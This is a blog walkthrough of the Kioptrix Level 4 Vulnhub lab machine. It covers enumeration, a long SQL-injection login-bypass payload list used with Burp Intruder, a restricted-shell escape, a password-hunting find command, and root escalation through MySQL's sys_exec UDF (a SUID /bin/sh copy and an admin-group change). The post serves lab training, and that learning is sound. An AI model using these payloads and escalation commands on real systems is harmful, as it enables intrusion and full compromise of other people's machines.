<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.6.2"><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="Kioptrix Level 4 Vulnhub Walkthrough" /><meta name="author" content="Mohamed Ezzat" /><meta property="og:locale" content="en_US" /><meta name="description" content="Machine Info: Difficulty: Easy Goal: Gain root access" /><meta property="og:description" content="Machine Info: Difficulty: Easy Goal: Gain root access" /><link rel="canonical" href="https://mohamedaezzat.github.io/posts/kioptrix4/" /><meta property="og:url" content="https://mohamedaezzat.github.io/posts/kioptrix4/" /><meta property="og:site_name" content="Echo" /><meta property="og:image" content="https://mohamedaezzat.github.io/assets/img/posts/kioptrix4/kioptrix4.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-05T11:15:14+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://mohamedaezzat.github.io/assets/img/posts/kioptrix4/kioptrix4.png" /><meta property="twitter:title" content="Kioptrix Level 4 Vulnhub Walkthrough" /><meta name="google-site-verification" content="SgWV4a8DvyptkO8yPJwWMZ7DexcYzADmzpG_jTBbaVY" /> <script type="application/ld+json"> {"image":"https://mohamedaezzat.github.io/assets/img/posts/kioptrix4/kioptrix4.png","description":"Machine Info: Difficulty: Easy Goal: Gain root access","url":"https://mohamedaezzat.github.io/posts/kioptrix4/","headline":"Kioptrix Level 4 Vulnhub Walkthrough","dateModified":"2019-09-05T11:15:14+02:00","@type":"BlogPosting","datePublished":"2019-09-05T11:15:14+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mohamedaezzat.github.io/posts/kioptrix4/"},"author":{"@type":"Person","name":"Mohamed Ezzat"},"@context":"https://schema.org"}</script><title>Kioptrix Level 4 Vulnhub Walkthrough | Echo</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Echo</a></div><div class="site-subtitle font-italic">Hacking Stuff</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/MohamedAEzzat" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mohamedahmedpk','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Kioptrix Level 4 Vulnhub Walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kioptrix Level 4 Vulnhub Walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 5, 2019, 11:15 AM +0200" > Sep 5, 2019 <i class="unloaded">2019-09-05T11:15:14+02:00</i> </span> by <span class="author"> Mohamed Ezzat </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/kioptrix4.png" class="preview-img"><h2 id="machine-info">Machine Info:</h2><ul><li>Difficulty: Easy<li>Goal: Gain root access</ul><h2 id="network-scanning">Network scanning</h2><h3 id="netdiscover">Netdiscover</h3><p>We start with netdiscover to determin the target IP address.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>netdiscover <span class="nt">-i</span> eth1
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/1.png" alt="netdiscover" /></p><h3 id="nmap">Nmap</h3><p>After we got the target IP address, we run nmap to discover open ports and runinning services.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-A</span> 192.168.56.119
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/2.png" alt="nmap" /></p><h2 id="enumeration">Enumeration</h2><h3 id="smb-enumeration">SMB Enumeration</h3><p>As a result of nmap, we found a bunch of open ports and services. We start by smb service that is running on port 139 and 445. We run enum4linux tool to try to find the users and shared files on the target machine. We did not find any interested shared files but we got number of users such as nobody, robert, root, john, and loneferret.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux 192.168.56.119
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/enum4linux.png" alt="enum4linux" /></p><h3 id="http-enumeration">HTTP Enumeration</h3><p>Then, we go to enumerate the http service and start with gobuster for directory brute forcing to list all the available directories. We found a directory called john which is the same user that we found by enum4linux, so let’s put that into our consideration which may help us later.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/gobuster.png" alt="gobuster" /></p><p>Then, we go to the website to see what is going there and we found a login page. Therefore, we try sql injection to see what will happen by input just a single quote in both fields username and password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/3.1.png" alt="http" /></p><p>And we found that the target machine is using mysql database and there is a sql injection vulnerability.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/3.2.png" alt="http" /></p><h2 id="exploitation">Exploitation</h2><p>Since we know there is a user called john on the target machine, we are going to use that user and brute force the password field by sql payloads. Here we entered the username “john” and any password such as “12345”.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/3.3.png" alt="http" /></p><p>Then, we run burp suite to intercept the request and send it to the intruder. On the positions tab, we select the password field and the attack type that we are going to use is sniper to try all the payloads on the password field.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/4.1.png" alt="burp" /></p><p>On the payloads tab, we copy and paste the sql payloads that we are going to use.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
</pre><td class="rouge-code"><pre><span class="s1">'-'</span>
<span class="s1">' '</span>
<span class="s1">'&amp;'</span>
<span class="s1">'^'</span>
<span class="s1">'*'</span>
<span class="s1">' or </span><span class="se">''</span><span class="s1">-'</span>
<span class="s1">' or </span><span class="se">''</span><span class="s1"> '</span>
<span class="s1">' or </span><span class="se">''</span><span class="s1">&amp;'</span>
<span class="s1">' or </span><span class="se">''</span><span class="s1">^'</span>
<span class="s1">' or </span><span class="se">''</span><span class="s1">*'</span>
<span class="nv">"-"</span>
<span class="nv">" "</span>
<span class="nv">"&amp;"</span>
<span class="nv">"^"</span>
<span class="nv">"*"</span>
<span class="nv">" or </span><span class="se">""</span><span class="nv">-"</span>
<span class="nv">" or </span><span class="se">""</span><span class="nv"> "</span>
<span class="nv">" or </span><span class="se">""</span><span class="nv">&amp;"</span>
<span class="nv">" or </span><span class="se">""</span><span class="nv">^"</span>
<span class="nv">" or </span><span class="se">""</span><span class="nv">*"</span>
<span class="k">or</span> <span class="k">true</span><span class="c1">--</span>
<span class="nv">" or true--
' or true--
"</span><span class="p">)</span> <span class="k">or</span> <span class="k">true</span><span class="c1">--</span>
<span class="s1">') or true--
'</span> <span class="k">or</span> <span class="s1">'x'</span><span class="o">=</span><span class="s1">'x
'</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="s1">'x'</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="s1">'x
'</span><span class="p">))</span> <span class="k">or</span> <span class="p">((</span><span class="s1">'x'</span><span class="p">))</span><span class="o">=</span><span class="p">((</span><span class="s1">'x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="c1">--</span>
<span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
<span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--</span>
<span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
<span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
' or 1=1 #
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/4.2.png" alt="burp" /></p><p>And on the options tab at the Grep-Extract section, we click on fetch response and select “Wrong Username or Password” so that will ease for us to discover which of the sql payloads succeeded to login.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/4.3.png" alt="burp" /></p><p>Then, we scroll down untill redirections section and select always to follow all the redirections.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/4.4.png" alt="burp" /></p><p>Now our attack is ready to start. We start the attack and after waiting for some time, we succeeded to login.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/4.5.png" alt="burp" /></p><p>After we logged in, here is john’s credentials.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/5.png" alt="john_profile" /></p><p>we use the found credentials to login to ssh and we successfully logged in. Then, we found that we are using a limited shell so we spawn a tty shell using that echo command to get a full interactive shell. After that, we need for privilege escalation so we run that find command to search for any plain text passwords and we found a blank mysql password at “/var/www/john/john.php”.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ssh john@192.168.56.119
<span class="nb">help
echo </span>os.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">cd</span> /
find / <span class="nt">-maxdepth</span> 5 <span class="nt">-name</span> <span class="k">*</span>.php <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">grep</span> <span class="nt">-Hn</span> password <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/6.png" alt="ssh" /></p><p>So we changed our directory to “/var/www/john” to get a look over john.php. We found a mysql credentials with username is “root” and passowrd is “”.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /var/www/john/
<span class="nb">cat </span>john.php
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/7.png" alt="john.php" /></p><h2 id="privilege-escalation">Privilege Escalation</h2><p>We can leverage that found mysql credentials for privilege escalation, but first we neet to know if mysql is running on the target machine as root or not so we run that ps command and we noticed that the mysql is running as root.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ps aux | <span class="nb">grep </span>mysql
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/8.png" alt="ps" /></p><p>There is a module called User Defined Function (or UDF) in mysql. This module allows us to execute system commands within mysql so we logged in as root without a password then enumerating over the databases and tables. We use mysql database and select all entities from func table which is the table that contains UDF. We found a function called sys_exec that we will try to use for privilege escalation.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>mysql <span class="nt">-u</span> root
show databases<span class="p">;</span>
use mysql
show tables<span class="p">;</span>
<span class="k">select</span> <span class="k">*</span> from func
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/9.png" alt="show_databases" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/10.png" alt="UDF" /></p><h3 id="method-1">Method 1</h3><p>We use sys_exec function to copy /bin/sh to /tmp directory and change its ownership to root and its permissions to SUID and SGID so we can run that sh program as root and therefore get a root shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">select </span>sys_exec<span class="o">(</span><span class="s1">'cp /bin/sh /tmp; chown root:root /tmp/sh; chmod +s /tmp/sh'</span><span class="o">)</span><span class="p">;</span>
<span class="nb">exit</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/11.png" alt="sys_exec" /></p><p>We change our directory to /tmp then run the sh program and finally we got a root shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /tmp
<span class="nb">ls</span>
./sh
<span class="nb">id
whoami</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/12.png" alt="root1" /></p><h3 id="method-2">Method 2</h3><p>We also can use sys_exec function to add john user to admin group so we can use sudo command to switch to root user easily.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">select </span>sys_exec<span class="o">(</span><span class="s1">'usermod -a -G admin john'</span><span class="o">)</span><span class="p">;</span>
<span class="nb">sudo </span>su
<span class="nb">id
whoami</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/13.png" alt="root2" /></p><p>And eventually, here is the flag</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">cd</span> ~
<span class="nb">ls
cat </span>congrats.txt
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/kioptrix4/flag.png" alt="flag" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>Vulnhub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/boot2root/" class="post-tag no-text-decoration" >boot2root</a> <a href="/tags/ethical-hacking/" class="post-tag no-text-decoration" >ethical hacking</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Kioptrix Level 4 Vulnhub Walkthrough - Echo&url=https://mohamedaezzat.github.io/posts/kioptrix4/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Kioptrix Level 4 Vulnhub Walkthrough - Echo&u=https://mohamedaezzat.github.io/posts/kioptrix4/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Kioptrix Level 4 Vulnhub Walkthrough - Echo&url=https://mohamedaezzat.github.io/posts/kioptrix4/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ethical-hacking/">ethical hacking</a> <a class="post-tag" href="/tags/boot2root/">boot2root</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/htb/">htb</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/troll1/"><div class="card-body"> <span class="timeago small" > Sep 9, 2019 <i class="unloaded">2019-09-09T18:01:38+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tr0ll 1 Vulnhub Walkthrough</h3><div class="text-muted small"><p> Machine Info: Difficulty: Beginner Goal: Gain root access and get Proof.txt from the /root directory Network Scanning Netdiscover As we do every time, we run netdiscover to determine the tar...</p></div></div></a></div><div class="card"> <a href="/posts/troll2/"><div class="card-body"> <span class="timeago small" > Sep 11, 2019 <i class="unloaded">2019-09-11T18:13:54+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tr0ll 2 Vulnhub Walkthrough</h3><div class="text-muted small"><p> Machine Info Difficulty: Beginner++ to intermediate Goal: Gain root access and get Proof.txt from the /root directory Network Scanning Netdiscover As we do every single time, we run netdisco...</p></div></div></a></div><div class="card"> <a href="/posts/Kioptrix1/"><div class="card-body"> <span class="timeago small" > Aug 31, 2019 <i class="unloaded">2019-08-31T00:15:21+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Kioptrix Level 1 Vulnhub Walkthrough</h3><div class="text-muted small"><p> Machine Info Difficulty: Easy Goal: Gain root access Network Scanning Netdiscover We run netdiscover to get the IP address of kioptrix level 1 through the host-only adapter interface (eth1)...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/kioptrix3/" class="btn btn-outline-primary"><p>Kioptrix Level 3 Vulnhub Walkthrough</p></a> <a href="/posts/kioptrix5/" class="btn btn-outline-primary"><p>Kioptrix Level 5 Vulnhub Walkthrough</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/MohamedAEzzat">Mohamed Ezzat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ethical-hacking/">ethical hacking</a> <a class="post-tag" href="/tags/boot2root/">boot2root</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/htb/">htb</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 